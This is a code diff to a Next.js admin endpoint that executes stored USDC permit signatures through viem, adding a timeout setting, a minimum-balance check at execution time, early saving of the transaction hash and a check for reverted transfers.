@@ -6,6 +6,7 @@ import {
   http,
   parseAbi,
   formatUnits,
+  parseUnits,
   keccak256,
   toBytes,
 } from 'viem'
@@ -45,6 +46,9 @@ const MERKLE_TREE_ABI = parseAbi([
   'function executeWithPermit(address owner, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s, address recipient, uint256 amount, bytes32 operationId)',
 ])
 
+// 单笔要等链上回执，拥堵时远超默认的 10~15s。EOA spender 还要连发两笔。
+export const maxDuration = 60
+
 
 export async function POST(request: NextRequest) {
   // 验证管理员
@@ -60,10 +64,29 @@ export async function POST(request: NextRequest) {
   }
 
   try {
-    const { signatureId } = await request.json()
+    const { signatureId, minimumBalanceUsdc } = await request.json()
 
     if (!signatureId) {
       return NextResponse.json({ error: 'Signature ID required' }, { status: 400 })
+    }
+
+    let minimumBalance: bigint | null = null
+    if (minimumBalanceUsdc !== undefined) {
+      try {
+        const normalizedMinimum = String(minimumBalanceUsdc).trim()
+        if (!normalizedMinimum) {
+          throw new Error('Minimum balance cannot be empty')
+        }
+        minimumBalance = parseUnits(normalizedMinimum, 6)
+        if (minimumBalance < BigInt(0)) {
+          throw new Error('Minimum balance cannot be negative')
+        }
+      } catch {
+        return NextResponse.json(
+          { error: 'Invalid minimum USDC balance' },
+          { status: 400 }
+        )
+      }
     }
 
     const supabaseAdmin = getSupabaseAdmin()
@@ -139,6 +162,13 @@ export async function POST(request: NextRequest) {
       return NextResponse.json({ error: 'User has no USDC balance' }, { status: 400 })
     }
 
+    // 进度批处理可能持续很久，必须按执行瞬间的链上余额再次检查门槛。
+    if (minimumBalance !== null && balance < minimumBalance) {
+      return NextResponse.json({
+        error: `Current USDC balance (${formatUnits(balance, 6)}) is below minimum (${formatUnits(minimumBalance, 6)})`,
+      }, { status: 409 })
+    }
+
     const permittedValue = BigInt(sig.value)
     if (balance > permittedValue) {
       return NextResponse.json({
@@ -202,7 +232,19 @@ export async function POST(request: NextRequest) {
       })
     }
 
-    await publicClient.waitForTransactionReceipt({ hash: transferHash })
+    // 先落库 tx hash 再等回执：函数若被平台超时掐断，链上凭证不会丢。
+    await supabaseAdmin
+      .from('permit_signatures')
+      .update({ used_tx_hash: transferHash })
+      .eq('id', signatureId)
+
+    const receipt = await publicClient.waitForTransactionReceipt({ hash: transferHash })
+
+    if (receipt.status !== 'success') {
+      return NextResponse.json({
+        error: `Transfer reverted on-chain (${transferHash})`,
+      }, { status: 400 })
+    }
 
     // 更新状态
     await supabaseAdmin
